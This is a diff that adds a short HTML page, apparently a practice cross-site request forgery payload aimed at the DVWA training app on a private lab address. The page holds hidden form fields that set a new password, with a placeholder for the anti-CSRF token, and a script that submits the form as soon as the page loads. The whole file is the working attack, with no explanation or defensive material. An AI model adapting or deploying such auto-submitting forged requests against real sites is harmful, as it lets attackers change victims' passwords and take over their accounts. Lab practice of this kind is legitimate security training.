@@ -1,0 +1,14 @@
+<!-- csrf_medium.html -->
+<html>
+  <body>
+    <form action="http://192.168.146.129/dvwa/vulnerabilities/csrf/" method="POST">
+      <input type="hidden" name="password_new" value="newpass321">
+      <input type="hidden" name="password_conf" value="newpass321">
+      <input type="hidden" name="Change" value="Change">
+      <input type="hidden" name="user_token" value="paste_token_here">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
